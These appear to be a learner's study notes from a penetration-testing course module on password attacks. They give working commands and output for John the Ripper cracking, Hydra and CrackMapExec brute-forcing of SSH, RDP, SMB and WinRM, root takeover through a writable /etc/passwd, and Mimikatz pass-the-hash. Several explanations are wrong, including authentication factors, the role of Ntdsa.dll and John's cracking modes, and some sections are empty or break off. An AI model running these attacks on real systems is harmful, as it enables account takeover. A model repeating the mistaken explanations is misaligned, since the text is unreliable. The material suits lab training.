
![](https://i.imgur.com/slTZMz7.png)

# Password Attacks

This module will focus on attacking and bypassing the tenet of `Authentication` by compromising user passwords in many different operating systems, applications, and encryption types.
 
Authentication, at its core, is the validation of your identity by presenting a combination of three main factors to a validation mechanism. They are;

1. Something you know (a password, passcode, pin, etc.).
2. Something you have (an ID Card, security key, or other MFA tools).
3. Something you are (your physical self, username, email address, or other identifiers.)

## Linux

Linux-based systems handle everything in the form of a file. Passwords are also stored encrypted in a file. This file is called the `shadow` file and is located in `/etc/shadow` and is part of the Linux user management system. In addition, these passwords are commonly stored in the form of `hashes`. An example can look like this:
#### Shadow File
```c
root@htb:~# cat /etc/shadow

...SNIP...
htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
```

The `/etc/shadow` file has a unique format in which the entries are entered and saved when new users are created.

||||||||||
|---|---|---|---|---|---|---|---|---|
|htb-student:|$y $j9T$3QSBB6CbHEu...SNIP...f8Ms:|18955:|0:|99999:|7:|:|:|:|
|`<username>`:|`<encrypted password>`:|`<day of last change>`:|`<min age>`:|`<max age>`:|`<warning period>`:|`<inactivity period>`:|`<expiration date>`:|`<reserved field>`|

The encryption of the password in this file is formatted as follows:

||||
|---|---|---|
|`$ <id>`|`$ <salt>`|`$ <hashed>`|
|`$ y`|`$ j9T`|`$ 3QSBB6CbHEu...SNIP...f8Ms`|

The type (`id`) is the cryptographic hash method used to encrypt the password. Many different cryptographic hash methods were used in the past and are still used by some systems today.

| **ID**   | **Cryptographic Hash Algorithm**                                      |
| -------- | --------------------------------------------------------------------- |
| `$1$`    | [MD5](https://en.wikipedia.org/wiki/MD5)                              |
| `$2a$`   | [Blowfish](https://en.wikipedia.org/wiki/Blowfish_(cipher))           |
| `$5$`    | [SHA-256](https://en.wikipedia.org/wiki/SHA-2)                        |
| `$6$`    | [SHA-512](https://en.wikipedia.org/wiki/SHA-2)                        |
| `$sha1$` | [SHA1crypt](https://en.wikipedia.org/wiki/SHA-1)                      |
| `$y$`    | [Yescrypt](https://github.com/openwall/yescrypt)                      |
| `$gy$`   | [Gost-yescrypt](https://www.openwall.com/lists/yescrypt/2019/06/30/1) |
| `$7$`    | [Scrypt](https://en.wikipedia.org/wiki/Scrypt)                        |
#### Passwd File

  Credential Storage

```c
r3so1v3@htb[/htb]$ cat /etc/passwd

...SNIP...
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

||||||||
|---|---|---|---|---|---|---|
|`htb-student:`|`x:`|`1000:`|`1000:`|`,,,:`|`/home/htb-student:`|`/bin/bash`|
|`<username>:`|`<password>:`|`<uid>:`|`<gid>:`|`<comment>:`|`<home directory>:`|`<cmd executed after logging in>`|

 The /etc/passwd file, contains information about Unix/Linux system users. This file does not store passwords explicitly, but provides information about users such as their names, user IDs (UIDS), group IDs (GIDs), home directory, and the shell used to log in. This is what the lines in the /etc/passwd file mean: 
 
 root:x:0:0:root:/root:/bin/bash 
 root: user name 
 x: The password is stored encrypted in the /etc/shadow file 
 0:0: UID and GID (both equal to 0 for superuser) 
 root: description or comment 
 /root: the user's home directory 
 /bin/bash: the command shell used to log in

The `x` in the password field indicates that the encrypted password is in the `/etc/shadow` file. However, the redirection to the `/etc/shadow` file does not make the users on the system invulnerable because if the rights of this file are set incorrectly, the file can be manipulated so that the user `root` does not need to type a password to log in. Therefore, an empty field means that we can log in with the username without entering a password.

## Windows Authentication Process

The [Local Security Authority](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) (`LSA`) is a protected subsystem that authenticates users and logs them into the local computer. In addition, the LSA maintains information about all aspects of local security on a computer. It also provides various services for translating between names and security IDs (`SIDs`).
![](https://i.imgur.com/AfN47Qy.png)

Local interactive logon is performed by the interaction between the logon process ([WinLogon](https://www.microsoftpressstore.com/articles/article.aspx?p=2228450&seqNum=8)), the logon user interface process (`LogonUI`), the `credential providers`, `LSASS`, one or more `authentication packages`, and `SAM` or `Active Directory`. Authentication packages, in this case, are the Dynamic-Link Libraries (`DLLs`) that perform authentication checks. For example, for non-domain joined and interactive logins, the authentication package `Msv1_0.dll` is used.

`Winlogon` is a trusted process responsible for managing security-related user interactions. These include:

- Launching LogonUI to enter passwords at login
    
- Changing passwords
    
- Locking and unlocking the workstation

#### LSASS

[Local Security Authority Subsystem Service](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) (`LSASS`) is a collection of many modules and has access to all authentication processes that can be found in `%SystemRoot%\System32\Lsass.exe`. This service is responsible for the local system security policy, user authentication, and sending security audit logs to the `Event log`. In other words, it is the vault for Windows-based operating systems.

| **Authentication Packages** | **Description**                                                                                                                                                                                                                                                |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Lsasrv.dll`                | The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful. |
| `Msv1_0.dll`                | Authentication package for local machine logons that don't require custom authentication.                                                                                                                                                                      |
| `Samsrv.dll`                | The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.                                                                                                                                       |
| `Kerberos.dll`              | Security package loaded by the LSA for Kerberos-based authentication on a machine.                                                                                                                                                                             |
| `Netlogon.dll`              | Network-based logon service.                                                                                                                                                                                                                                   |
| `Ntdsa.dll`                 | This library is used to create new records and folders in the Windows registry.                                                                                                                                                                                |

Each interactive logon session creates a separate instance of the Winlogon service. The [Graphical Identification and Authentication](https://docs.microsoft.com/en-us/windows/win32/secauthn/gina) (`GINA`) architecture is loaded into the process area used by Winlogon, receives and processes the credentials, and invokes the authentication interfaces via the [LSALogonUser](https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsalogonuser) function.

#### SAM Database

The [Security Account Manager](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748(v=ws.10)?redirectedfrom=MSDN) (`SAM`) is a database file in Windows operating systems that stores users' passwords. It can be used to authenticate local and remote users. SAM uses cryptographic measures to prevent unauthenticated users from accessing the system. User passwords are stored in a hash format in a registry structure as either an `LM` hash or an `NTLM` hash. This file is located in `%SystemRoot%/system32/config/SAM` and is mounted on HKLM/SAM. SYSTEM level permissions are required to view it.

#### Credential Manager
![](https://i.imgur.com/2yXg7oz.png)

Credential Manager is a feature built-in to all Windows operating systems that allows users to save the credentials they use to access various network resources and websites. Saved credentials are stored based on user profiles in each user's `Credential Locker`. Credentials are encrypted and stored at the following location:
```c
PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
```

#### NTDS

It is very common to come across network environments where Windows systems are joined to a Windows domain. This is common because it makes it easier for admins to manage all the systems owned by their respective organizations (centralized management). In these cases, the Windows systems will send all logon requests to Domain Controllers that belong to the same Active Directory forest. Each Domain Controller hosts a file called `NTDS.dit` that is kept synchronized across all Domain Controllers with the exception of [Read-Only Domain Controllers](https://docs.microsoft.com/en-us/windows/win32/ad/rodc-and-active-directory-schema). NTDS.dit is a database file that stores the data in Active Directory, including but not limited to:

- User accounts (username & password hash)
- Group accounts
- Computer accounts
- Group policy objects

## John The Ripper
John the Ripper (JTR or john) is an essential pentesting tool used to check the strength of passwords and crack encrypted (or hashed) passwords using either brute force or dictionary attacks.

| **Encryption Technology**                 | **Description**                                                                                                                   |
| ----------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| `UNIX crypt(3)`                           | Crypt(3) is a traditional UNIX encryption system with a 56-bit key.                                                               |
| `Traditional DES-based`                   | DES-based encryption uses the Data Encryption Standard algorithm to encrypt data.                                                 |
| `bigcrypt`                                | Bigcrypt is an extension of traditional DES-based encryption. It uses a 128-bit key.                                              |
| `BSDI extended DES-based`                 | BSDI extended DES-based encryption is an extension of the traditional DES-based encryption and uses a 168-bit key.                |
| `FreeBSD MD5-based` (Linux & Cisco)       | FreeBSD MD5-based encryption uses the MD5 algorithm to encrypt data with a 128-bit key.                                           |
| `OpenBSD Blowfish-based`                  | OpenBSD Blowfish-based encryption uses the Blowfish algorithm to encrypt data with a 448-bit key.                                 |
| `Kerberos/AFS`                            | Kerberos and AFS are authentication systems that use encryption to ensure secure entity communication.                            |
| `Windows LM`                              | Windows LM encryption uses the Data Encryption Standard algorithm to encrypt data with a 56-bit key.                              |
| `DES-based tripcodes`                     | DES-based tripcodes are used to authenticate users based on the Data Encryption Standard algorithm.                               |
| `SHA-crypt hashes`                        | SHA-crypt hashes are used to encrypt data with a 256-bit key and are available in newer versions of Fedora and Ubuntu.            |
| `SHA-crypt` and `SUNMD5 hashes` (Solaris) | SHA-crypt and SUNMD5 hashes use the SHA-crypt and MD5 algorithms to encrypt data with a 256-bit key and are available in Solaris. |
## Cracking Modes

`Single Crack Mode` is one of the most common John modes used when attempting to crack passwords using a single password list. It is a brute-force attack, meaning all passwords on the list are tried, one by one, until the correct one is found. This method is the most basic and straightforward way of cracking passwords and is thus a popular choice for those wishing to gain access to a secure system. It is, however, far from the most efficient method since it can take an indefinite amount of time to crack a password, depending on the length and complexity of the password in question. The basic syntax for the command is:
#### Single Crack Mode
```c
r3so1v3@htb[/htb]$ john --format=<hash_type> <hash or hash_file>
```

For example, if we have a file named `hashes_to_crack.txt` that contains `SHA-256` hashes, the command to crack them would be:
```c
r3so1v3@htb[/htb]$ john --format=sha256 hashes_to_crack.txt
```

#### Cracking with John

| **Hash Format**      | **Example Command**                                 | **Description**                                                      |
| -------------------- | --------------------------------------------------- | -------------------------------------------------------------------- |
| afs                  | `john --format=afs hashes_to_crack.txt`             | AFS (Andrew File System) password hashes                             |
| bfegg                | `john --format=bfegg hashes_to_crack.txt`           | bfegg hashes used in Eggdrop IRC bots                                |
| bf                   | `john --format=bf hashes_to_crack.txt`              | Blowfish-based crypt(3) hashes                                       |
| bsdi                 | `john --format=bsdi hashes_to_crack.txt`            | BSDi crypt(3) hashes                                                 |
| crypt(3)             | `john --format=crypt hashes_to_crack.txt`           | Traditional Unix crypt(3) hashes                                     |
| des                  | `john --format=des hashes_to_crack.txt`             | Traditional DES-based crypt(3) hashes                                |
| dmd5                 | `john --format=dmd5 hashes_to_crack.txt`            | DMD5 (Dragonfly BSD MD5) password hashes                             |
| dominosec            | `john --format=dominosec hashes_to_crack.txt`       | IBM Lotus Domino 6/7 password hashes                                 |
| EPiServer SID hashes | `john --format=episerver hashes_to_crack.txt`       | EPiServer SID (Security Identifier) password hashes                  |
| hdaa                 | `john --format=hdaa hashes_to_crack.txt`            | hdaa password hashes used in Openwall GNU/Linux                      |
| hmac-md5             | `john --format=hmac-md5 hashes_to_crack.txt`        | hmac-md5 password hashes                                             |
| hmailserver          | `john --format=hmailserver hashes_to_crack.txt`     | hmailserver password hashes                                          |
| ipb2                 | `john --format=ipb2 hashes_to_crack.txt`            | Invision Power Board 2 password hashes                               |
| krb4                 | `john --format=krb4 hashes_to_crack.txt`            | Kerberos 4 password hashes                                           |
| krb5                 | `john --format=krb5 hashes_to_crack.txt`            | Kerberos 5 password hashes                                           |
| LM                   | `john --format=LM hashes_to_crack.txt`              | LM (Lan Manager) password hashes                                     |
| lotus5               | `john --format=lotus5 hashes_to_crack.txt`          | Lotus Notes/Domino 5 password hashes                                 |
| mscash               | `john --format=mscash hashes_to_crack.txt`          | MS Cache password hashes                                             |
| mscash2              | `john --format=mscash2 hashes_to_crack.txt`         | MS Cache v2 password hashes                                          |
| mschapv2             | `john --format=mschapv2 hashes_to_crack.txt`        | MS CHAP v2 password hashes                                           |
| mskrb5               | `john --format=mskrb5 hashes_to_crack.txt`          | MS Kerberos 5 password hashes                                        |
| mssql05              | `john --format=mssql05 hashes_to_crack.txt`         | MS SQL 2005 password hashes                                          |
| mssql                | `john --format=mssql hashes_to_crack.txt`           | MS SQL password hashes                                               |
| mysql-fast           | `john --format=mysql-fast hashes_to_crack.txt`      | MySQL fast password hashes                                           |
| mysql                | `john --format=mysql hashes_to_crack.txt`           | MySQL password hashes                                                |
| mysql-sha1           | `john --format=mysql-sha1 hashes_to_crack.txt`      | MySQL SHA1 password hashes                                           |
| NETLM                | `john --format=netlm hashes_to_crack.txt`           | NETLM (NT LAN Manager) password hashes                               |
| NETLMv2              | `john --format=netlmv2 hashes_to_crack.txt`         | NETLMv2 (NT LAN Manager version 2) password hashes                   |
| NETNTLM              | `john --format=netntlm hashes_to_crack.txt`         | NETNTLM (NT LAN Manager) password hashes                             |
| NETNTLMv2            | `john --format=netntlmv2 hashes_to_crack.txt`       | NETNTLMv2 (NT LAN Manager version 2) password hashes                 |
| NEThalfLM            | `john --format=nethalflm hashes_to_crack.txt`       | NEThalfLM (NT LAN Manager) password hashes                           |
| md5ns                | `john --format=md5ns hashes_to_crack.txt`           | md5ns (MD5 namespace) password hashes                                |
| nsldap               | `john --format=nsldap hashes_to_crack.txt`          | nsldap (OpenLDAP SHA) password hashes                                |
| ssha                 | `john --format=ssha hashes_to_crack.txt`            | ssha (Salted SHA) password hashes                                    |
| NT                   | `john --format=nt hashes_to_crack.txt`              | NT (Windows NT) password hashes                                      |
| openssha             | `john --format=openssha hashes_to_crack.txt`        | OPENSSH private key password hashes                                  |
| oracle11             | `john --format=oracle11 hashes_to_crack.txt`        | Oracle 11 password hashes                                            |
| oracle               | `john --format=oracle hashes_to_crack.txt`          | Oracle password hashes                                               |
| pdf                  | `john --format=pdf hashes_to_crack.txt`             | PDF (Portable Document Format) password hashes                       |
| phpass-md5           | `john --format=phpass-md5 hashes_to_crack.txt`      | PHPass-MD5 (Portable PHP password hashing framework) password hashes |
| phps                 | `john --format=phps hashes_to_crack.txt`            | PHPS password hashes                                                 |
| pix-md5              | `john --format=pix-md5 hashes_to_crack.txt`         | Cisco PIX MD5 password hashes                                        |
| po                   | `john --format=po hashes_to_crack.txt`              | Po (Sybase SQL Anywhere) password hashes                             |
| rar                  | `john --format=rar hashes_to_crack.txt`             | RAR (WinRAR) password hashes                                         |
| raw-md4              | `john --format=raw-md4 hashes_to_crack.txt`         | Raw MD4 password hashes                                              |
| raw-md5              | `john --format=raw-md5 hashes_to_crack.txt`         | Raw MD5 password hashes                                              |
| raw-md5-unicode      | `john --format=raw-md5-unicode hashes_to_crack.txt` | Raw MD5 Unicode password hashes                                      |
| raw-sha1             | `john --format=raw-sha1 hashes_to_crack.txt`        | Raw SHA1 password hashes                                             |
| raw-sha224           | `john --format=raw-sha224 hashes_to_crack.txt`      | Raw SHA224 password hashes                                           |
| raw-sha256           | `john --format=raw-sha256 hashes_to_crack.txt`      | Raw SHA256 password hashes                                           |
| raw-sha384           | `john --format=raw-sha384 hashes_to_crack.txt`      | Raw SHA384 password hashes                                           |
| raw-sha512           | `john --format=raw-sha512 hashes_to_crack.txt`      | Raw SHA512 password hashes                                           |
| salted-sha           | `john --format=salted-sha hashes_to_crack.txt`      | Salted SHA password hashes                                           |
| sapb                 | `john --format=sapb hashes_to_crack.txt`            | SAP CODVN B (BCODE) password hashes                                  |
| sapg                 | `john --format=sapg hashes_to_crack.txt`            | SAP CODVN G (PASSCODE) password hashes                               |
| sha1-gen             | `john --format=sha1-gen hashes_to_crack.txt`        | Generic SHA1 password hashes                                         |
| skey                 | `john --format=skey hashes_to_crack.txt`            | S/Key (One-time password) hashes                                     |
| ssh                  | `john --format=ssh hashes_to_crack.txt`             | SSH (Secure Shell) password hashes                                   |
| sybasease            | `john --format=sybasease hashes_to_crack.txt`       | Sybase ASE password hashes                                           |
| xsha                 | `john --format=xsha hashes_to_crack.txt`            | xsha (Extended SHA) password hashes                                  |
| zip                  | `john --format=zip hashes_to_crack.txt`             | ZIP (WinZip) password hashes                                         |
#### Wordlist Mode

`Wordlist Mode` is used to crack passwords using multiple lists of words. It is a dictionary attack which means it will try all the words in the lists one by one until it finds the right one. It is generally used for cracking multiple password hashes using a wordlist or a combination of wordlists. It is more effective than Single Crack Mode because it utilizes more words but is still relatively basic. The basic syntax for the command is:
```c
r3so1v3@htb[/htb]$ john --wordlist=<wordlist_file> --rules <hash_file>
```

#### Incremental Mode

`Incremental Mode` is an advanced John mode used to crack passwords using a character set. It is a hybrid attack, which means it will attempt to match the password by trying all possible combinations of characters from the character set. This mode is the most effective yet most time-consuming of all the John modes. This mode works best when we know what the password might be, as it will try all the possible combinations in sequence, starting from the shortest one.
```c
r3so1v3@htb[/htb]$ john --incremental <hash_file>
```

It is also possible to crack even password-protected or encrypted files with John. We use additional tools that process the given files and produce hashes that John can work with. It automatically detects the formats and tries to crack them. The syntax for this can look like this:
#### Cracking Files with John
```c
cry0l1t3@htb:~$ <tool> <file_to_crack> > file.hash
cry0l1t3@htb:~$ pdf2john server_doc.pdf > server_doc.hash
cry0l1t3@htb:~$ john server_doc.hash
                # OR
cry0l1t3@htb:~$ john --wordlist=<wordlist.txt> server_doc.hash 
```

Additionally, we can use different modes for this with our personal wordlists and rules. We have created a list that includes many but not all tools that can be used for John:

| **Tool**                | **Description**                               |
| ----------------------- | --------------------------------------------- |
| `pdf2john`              | Converts PDF documents for John               |
| `ssh2john`              | Converts SSH private keys for John            |
| `mscash2john`           | Converts MS Cash hashes for John              |
| `keychain2john`         | Converts OS X keychain files for John         |
| `rar2john`              | Converts RAR archives for John                |
| `pfx2john`              | Converts PKCS#12 files for John               |
| `truecrypt_volume2john` | Converts TrueCrypt volumes for John           |
| `keepass2john`          | Converts KeePass databases for John           |
| `vncpcap2john`          | Converts VNC PCAP files for John              |
| `putty2john`            | Converts PuTTY private keys for John          |
| `zip2john`              | Converts ZIP archives for John                |
| `hccap2john`            | Converts WPA/WPA2 handshake captures for John |
| `office2john`           | Converts MS Office documents for John         |
| `wpa2john`              | Converts WPA/WPA2 handshakes for John         |
## WinRM

[Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) (`WinRM`) is the Microsoft implementation of the network protocol [Web Services Management Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) (`WS-Management`). It is a network protocol based on XML web services using the [Simple Object Access Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary) (`SOAP`) used for remote management of Windows systems. It takes care of the communication between [Web-Based Enterprise Management](https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management) (`WBEM`) and the [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (`WMI`), which can call the [Distributed Component Object Model](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0) (`DCOM`).

#### CrackMapExec
A handy tool that we can use for our password attacks.
```c
r3so1v3@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

```c
r3so1v3@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

#### Evil-WinRM
Another handy tool that we can use to communicate with the WinRM service:
```c
r3so1v3@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```

```c
r3so1v3@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents>
```

## SSH

[Secure Shell](https://www.ssh.com/academy/ssh/protocol) (`SSH`) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on `TCP port 22` by default, to which we can connect using an SSH client. This service uses three different cryptography operations/methods: `symmetric` encryption, `asymmetric` encryption, and `hashing`.

#### Symmetric Encryption

Symmetric encryption uses the `same key` for encryption and decryption. However, anyone who has access to the key could also access the transmitted data. Therefore, a key exchange procedure is needed for secure symmetric encryption. The [Diffie-Hellman](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange) key exchange method is used for this purpose. If a third party obtains the key, it cannot decrypt the messages because the key exchange method is unknown. However, this is used by the server and client to determine the secret key needed to access the data. Many different variants of the symmetrical cipher system can be used, such as AES, Blowfish, 3DES, etc.

#### Asymmetrical Encryption

Asymmetric encryption uses `two SSH keys`: a private key and a public key. The private key must remain secret because only it can decrypt the messages that have been encrypted with the public key. If an attacker obtains the private key, which is often not password protected, he will be able to log in to the system without credentials. Once a connection is established, the server uses the public key for initialization and authentication. If the client can decrypt the message, it has the private key, and the SSH session can begin.

#### Hashing

The hashing method converts the transmitted data into another unique value. SSH uses hashing to confirm the authenticity of messages. This is a mathematical algorithm that only works in one direction.

#### Hydra - SSH

We can use a tool such as `Hydra` to brute force SSH. 
```c
r3so1v3@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.129.42.197:22/
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

## Remote Desktop Protocol (RDP)

Microsoft's [Remote Desktop Protocol](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) (`RDP`) is a network protocol that allows remote access to Windows systems via `TCP port 3389` by default. RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization

#### Hydra - RDP

We can also use `Hydra` to perform RDP bruteforcing.
```c
r3so1v3@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:05:40
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task
[DATA] attacking rdp://10.129.42.197:3389/
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb3n password: rockstar, continuing attacking the account.
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: cry0l1t3 password: delta, continuing attacking the account.
[3389][rdp] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```


#### xFreeRDP - gui for RDP
```c
r3so1v3@htb[/htb]$ xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

```c
r3so1v3@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password

...SNIP...
New Certificate details:
        Common Name: WINSRV
        Subject:     CN = WINSRV
        Issuer:      CN = WINSRV
        Thumbprint:  cd:91:d0:3e:7f:b7:bb:40:0e:91:45:b0:ab:04:ef:1e:c8:d5:41:42:49:e0:0c:cd:c7:dd:7d:08:1f:7c:fe:eb

Do you trust the above certificate? (Y/T/N) Y
```
![](https://i.imgur.com/BtMD3TI.png)

## SMB

[Server Message Block](https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) (`SMB`) is a protocol responsible for transferring data between a client and a server in local area networks. It is used to implement file and directory sharing and printing services in Windows networks. SMB is often referred to as a file system, but it is not. SMB can be compared to `NFS` for Unix and Linux for providing drives on local networks.

SMB is also known as [Common Internet File System](https://cifs.com/) (`CIFS`). It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux, or macOS. In addition, we will often encounter [Samba](https://wiki.samba.org/index.php/Main_Page), which is an open-source implementation of the above functions. For SMB, we can also use `hydra` again to try different usernames in combination with different passwords.

#### Hydra - SMB
```c
r3so1v3@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:37:31
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[445][smb] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid passwords found
```


## Attacking SAM


## Attacking LSASS

In addition to getting copies of the SAM database to dump and crack hashes, we will also benefit from targeting LSASS. As discussed in the Credential Storage section of this module, LSASS is a critical service that plays a central role in credential management and the authentication processes in all Windows operating systems.

Upon initial logon, LSASS will:

    Cache credentials locally in memory
    Create access tokens
    Enforce security policies
    Write to Windows security log

### Linux log files directories
```
Log File 	Description
/var/log/messages 	Generic system activity logs.
/var/log/syslog 	Generic system activity logs.
/var/log/auth.log 	(Debian) All authentication related logs.
/var/log/secure 	(RedHat/CentOS) All authentication related logs.
/var/log/boot.log 	Booting information.
/var/log/dmesg 	Hardware and drivers related information and logs.
/var/log/kern.log 	Kernel related warnings, errors and logs.
/var/log/faillog 	Failed login attempts.
/var/log/cron 	Information related to cron jobs.
/var/log/mail.log 	All mail server related logs.
/var/log/httpd 	All Apache related logs.
/var/log/mysqld.log 	All MySQL server related logs.
```

Where we can get creds in linux for priv esc after establishing foothold:
```
| Files | History | Memory | Key-Rings |

| Configs | Logs | Cache | Browser stored credentials |
| Databases | Command-line History | In-memory Processing |
| Notes |
| Scripts |
| Source codes |
| Cronjobs |
| SSH Keys |
```

#### Passwd File

The /etc/passwd file contains information about every existing user on the system and can be read by all users and services. Each entry in the /etc/passwd file identifies a user on the system. Each entry has seven fields containing a form of a database with information about the particular user, where a colon (:) separates the information. Accordingly, such an entry may look something like this:
![](https://i.imgur.com/UTrXYNp.png)

Usually, we find the value x in this field, which means that the passwords are stored in an encrypted form in the /etc/shadow file. However, it can also be that the /etc/passwd file is writeable by mistake. This would allow us to clear this field for the user root so that the password info field is empty. This will cause the system not to send a password prompt when a user tries to log in as root.
Editing /etc/passwd - Before
Passwd, Shadow & Opasswd
```
root:x:0:0:root:/root:/bin/bash
```

Editing /etc/passwd - After
Passwd, Shadow & Opasswd
```
root::0:0:root:/root:/bin/bash
```

Root without Password
Passwd, Shadow & Opasswd
```c
[cry0l1t3@parrot]─[~]$ head -n 1 /etc/passwd
root::0:0:root:/root:/bin/bash

[cry0l1t3@parrot]─[~]$ su
[root@parrot]─[/home/cry0l1t3]#
```

#### Shadow File

Since reading the password hash values can put the entire system in danger, the file /etc/shadow was developed, which has a similar format to /etc/passwd but is only responsible for passwords and their management. It contains all the password information for the created users. For example, if there is no entry in the /etc/shadow file for a user in /etc/passwd, the user is considered invalid. The /etc/shadow file is also only readable by users who have administrator rights. The format of this file is divided into nine fields:
![](https://i.imgur.com/oaPHovE.png)

#### Pass the Hash (PtH)

A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.

The attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:

    Dumping the local SAM database from a compromised host.
    Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
    Pulling the hashes from memory (lsass.exe).

 Microsoft's Windows New Technology LAN Manager (NTLM) is a set of security protocols that authenticates users' identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user's identity without having them provide a password.

The first tool we will use to perform a Pass the Hash attack is Mimikatz. Mimikatz has a module named sekurlsa::pth that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. To use this module, we will need the following:

    /user - The user name we want to impersonate.
    /rc4 or /NTLM - NTLM hash of the user's password.
    /domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
    /run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

##### Pass the Hash from Windows Using Mimikatz:
```c
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
```

Now we can use cmd.exe to execute commands in the user's context. For this example, julio can connect to a shared folder named julio on the DC.
![](https://i.imgur.com/4yPxoRR.png)


#### Pass the Hash with PowerShell Invoke-TheHash (Windows)

